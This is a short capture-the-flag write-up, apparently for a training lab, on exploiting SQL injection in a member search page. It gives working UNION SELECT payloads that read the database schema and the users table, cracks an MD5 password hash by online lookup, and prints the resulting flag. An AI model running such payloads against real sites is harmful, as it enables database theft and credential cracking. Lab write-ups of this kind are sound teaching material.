# SQL injection
The member search page allows SQL injection.
http://192.168.99.100/?page=member

Searching for user ID 5 returns the following: `First name: Flag \n Surname: GetThe`. ID 4 and 6 don't exist.

Putting the following query in the member search input will get us the DB schema:
`1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns`
http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#
This reveals that the users table has the following columns:
user_id, first_name, last_name, town, country, planet, Commentaire, countersign

The following query will reveal something about GetThe Flag:
`1 AND 1=2 UNION SELECT Commentaire, countersign FROM users WHERE 1=1`
http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+Commentaire%2C+countersign+FROM+users+WHERE+1%3D1&Submit=Submit#
Commentaire: `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
countersign: `5ff9d0165b4f92b14994e5c685cdce28`
Looks like hex but that only returns garbage. Paste into Google and you get a few results for reverse MD5 hashes. It decodes as `FortyTwo`.
https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28

sha256(`fortytwo`) =>
Flag: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
